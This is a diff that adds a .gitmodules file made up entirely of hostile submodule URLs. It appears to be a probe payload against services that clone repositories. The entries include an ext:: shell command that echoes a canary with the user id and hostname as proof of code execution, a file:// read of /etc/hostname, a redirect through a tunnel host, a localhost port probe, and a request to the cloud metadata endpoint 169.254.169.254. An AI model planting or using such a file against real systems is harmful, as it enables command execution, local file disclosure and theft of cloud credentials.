@@ -1,0 +1,15 @@
+[submodule "s1ext"]
+	path = s1ext
+	url = ext::sh -c "echo EXTCANARY-RCE-PROOF-$(id -u)-$(hostname) >&2"
+[submodule "s2file"]
+	path = s2file
+	url = file:///etc/hostname
+[submodule "s3redir"]
+	path = s3redir
+	url = https://gathered-merchandise-sapphire-children.trycloudflare.com/redir302/x.git
+[submodule "s4loop"]
+	path = s4loop
+	url = http://127.0.0.1:1/closed.git
+[submodule "s5imds"]
+	path = s5imds
+	url = http://169.254.169.254/metadata/instance
